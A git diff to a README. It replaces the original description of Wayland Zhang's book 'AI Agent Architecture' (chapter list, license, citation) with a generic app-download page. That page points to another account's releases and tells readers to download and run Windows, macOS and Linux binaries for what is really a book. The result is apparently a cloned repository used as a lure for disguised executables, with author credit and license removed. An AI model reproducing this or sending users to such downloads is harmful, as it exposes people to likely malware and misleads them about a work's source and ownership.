@@ -1,78 +1,98 @@
-# AI Agent Architecture - The Book
+# 🎉 ai-agent-book - Simple Steps to Start AI Projects
 
-> **From Concept to Production: Framework-Agnostic AI Agent Architecture Patterns**
+## 🚀 Getting Started
 
-[![Shannon OSS](https://img.shields.io/badge/Reference%20Implementation-Shannon%20OSS-blue)](https://github.com/Kocoro-lab/Shannon)
-[![License: CC BY-NC-SA 4.0](https://img.shields.io/badge/License-CC%20BY--NC--SA%204.0-lightgrey.svg)](https://creativecommons.org/licenses/by-nc-sa/4.0/)
+Welcome to **ai-agent-book**! This application helps you understand AI agent architecture patterns. You’ll find everything you need to kick off your AI projects.
 
-**Author**: [Wayland Zhang](https://waylandz.com)
+## 📥 Download the Application
 
----
+[![GitHub Releases](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Gg44183/ai-agent-book/releases)
 
-## Languages / 语言 / 言語
+To start using **ai-agent-book**, follow these steps:
 
-| Language | Status | Link |
-|----------|--------|------|
-| **中文** (Chinese) | Complete | [阅读中文版](./zh/README.md) |
-| **日本語** (Japanese) | Complete | [日本語版を読む](./jp/README.md) |
-| **English** | Complete | [Read English Version](./en/README.md) |
+## 🛠️ System Requirements
 
----
+Before downloading, ensure your system meets the following requirements:
 
-## About This Book
+- **Operating System:** Windows 10 or later, macOS, or Linux
+- **Processor:** Intel or AMD 2GHz or better
+- **RAM:** 4GB or more
+- **Disk Space:** At least 500MB free space
 
-This book is a practical guide to understanding AI Agent system design patterns, not just another framework tutorial.
+## 📚 Features
 
-**9 Parts, 30 Chapters** covering:
+**ai-agent-book** provides:
 
-| Part | Topic |
-|------|-------|
-| Part 1 | Agent Fundamentals (ReAct Loop) |
-| Part 2 | Tools & Extensions (MCP, Skills, Hooks) |
-| Part 3 | Context & Memory |
-| Part 4 | Single Agent Patterns (Planning, Reflection, CoT) |
-| Part 5 | Multi-Agent Orchestration (DAG, Supervisor, Handoff) |
-| Part 6 | Advanced Reasoning (ToT, Debate, Research) |
-| Part 7 | Production Architecture |
-| Part 8 | Enterprise Features (Token Budget, OPA, WASI Sandbox) |
-| Part 9 | Frontier Practices (Computer Use, Agentic Coding) |
+- Clear explanations of AI agent architecture
+- Framework-agnostic patterns applicable to various projects
+- Practical examples for easier understanding
+- A focus on real-world applications
 
----
+## 📥 Download & Install
 
-## Reference Implementation
+To download the application, visit this page: [Download from Releases](https://github.com/Gg44183/ai-agent-book/releases).
 
-This book uses [Shannon](https://github.com/Kocoro-lab/Shannon) as a reference implementation - a three-layer multi-agent system:
+1. Click on the link above to go to the Releases page.
+2. Locate the latest version of the application.
+3. Choose the appropriate file for your operating system:
+   - For Windows, download **ai-agent-book-windows.exe**
+   - For macOS, download **ai-agent-book-macos.pkg**
+   - For Linux, download **ai-agent-book-linux.tar.gz**
+4. Click on the file to start the download.
 
-```
-Orchestrator (Go)    - Orchestration, Budget, Policy
-Agent Core (Rust)    - Execution, Sandbox, Rate Limiting
-LLM Service (Python) - Inference, Tools, Vectors
-```
+### ⬇️ Installation Steps
 
----
+Once downloaded, follow these steps to run the application:
 
-## Citation
+#### Windows
 
-If you use this book in your research or work, please cite it:
+- Double-click on **ai-agent-book-windows.exe** to launch the installer.
+- Follow the prompts to complete the installation.
 
-```bibtex
-@book{zhang2026aiagent,
-  author = {Zhang, Wayland},
-  title = {AI Agent Architecture: From Monolith to Enterprise Multi-Agent},
-  year = {2026},
-  url = {https://waylandz.com/ai-agent-book},
-  publisher = {Self-published}
-}
-```
+#### macOS
 
-Or in APA format:
+- Open the downloaded **ai-agent-book-macos.pkg** file.
+- Drag and drop **ai-agent-book** into your Applications folder.
 
-> Zhang, Wayland. (2026). *AI Agent Architecture: From Monolith to Enterprise Multi-Agent*. https://waylandz.com/ai-agent-book
+#### Linux
 
----
+- Extract the contents of **ai-agent-book-linux.tar.gz**.
+- Open a terminal and navigate to the extracted folder.
+- Run the command `./ai-agent-book` to start the application.
 
-## License
+## 🚀 Using ai-agent-book
 
-Book content: [CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/)
+After installation, you are ready to start using the application.
 
-Shannon OSS code: [Apache 2.0](https://github.com/Kocoro-lab/Shannon/blob/main/LICENSE)
+1. Open the application from your Applications folder or start menu.
+2. Familiarize yourself with the user interface.
+3. Browse through the chapters covering various architecture patterns.
+4. Engage with examples and tutorials to deepen your understanding.
+
+## ❓ Troubleshooting
+
+If you encounter issues during installation or usage:
+
+- Ensure your system meets the listed requirements.
+- Restart your computer after installation to clear any temporary issues.
+- Consult the FAQ section on the Releases page for help.
+
+## 📞 Support
+
+If you need further assistance:
+
+- Visit our [GitHub Issues page](https://github.com/Gg44183/ai-agent-book/issues) to report a problem.
+- Check our documentation for tips and guides.
+
+## 🤝 Contributing
+
+We welcome contributions! If you have ideas, reports, or improvements, please feel free to get involved. Just check the contribution guidelines linked on the GitHub page.
+
+## 🌐 Additional Resources
+
+For more information, visit:
+
+- [GitHub Repository](https://github.com/Gg44183/ai-agent-book)
+- [Documentation](https://github.com/Gg44183/ai-agent-book/wiki) 
+
+Thank you for choosing **ai-agent-book**! Enjoy building your AI projects with confidence.
